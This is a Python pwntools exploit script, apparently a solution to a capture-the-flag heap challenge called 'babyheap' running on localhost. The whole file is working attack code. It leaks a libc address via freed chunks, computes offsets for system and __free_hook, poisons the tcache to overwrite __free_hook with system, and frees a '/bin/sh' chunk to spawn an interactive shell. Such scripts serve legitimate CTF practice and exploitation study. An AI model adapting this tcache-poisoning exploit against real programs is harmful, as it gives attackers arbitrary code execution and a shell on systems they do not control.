from pwn import *

# p = process("./babyheap")
p = remote("127.0.0.1", 1337)

def alloc(idx, size, content):
  p.sendlineafter(">> ", "1")
  p.sendlineafter("Index: ", str(idx))
  p.sendlineafter("Size: ", str(size))
  p.sendlineafter("chunk: ", content)

def edit(idx, content):
  p.sendlineafter(">> ", "2")
  p.sendlineafter("Index: ", str(idx))
  p.sendlineafter("chunk: ", content)

def show(idx):
  p.sendlineafter(">> ", "4")
  p.sendlineafter("Index: ", str(idx))

def free(idx):
  p.sendlineafter(">> ", "3")
  p.sendlineafter("Index: ", str(idx))

for i in range(9): alloc(i, 0x80, '?' * 0x8)
# for i in range(8, 10): alloc(i, 0x)
for i in range(8): free(i) # ngisi tcache bin

show(7)
p.recvuntil("Content: ")
libc_leak =  u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x1ebbe0
log.info("Libc base: {}".format(hex(libc_base)))
libc_system = libc_base + 0x55410
log.info("Libc system: {}".format(hex(libc_system)))
libc_free_hook = libc_base + 0x1eeb28
log.info("Libc __free_hook: {}".format(hex(libc_free_hook)))

edit(5, p64(libc_free_hook))
edit(0, '/bin/sh\x00')
alloc(9, 0x80, '?' * 0x8)
alloc(10, 0x80, '?' * 0x8)
alloc(11, 0x80, p64(libc_system))

free(0)

# gdb.attach(p)

p.interactive()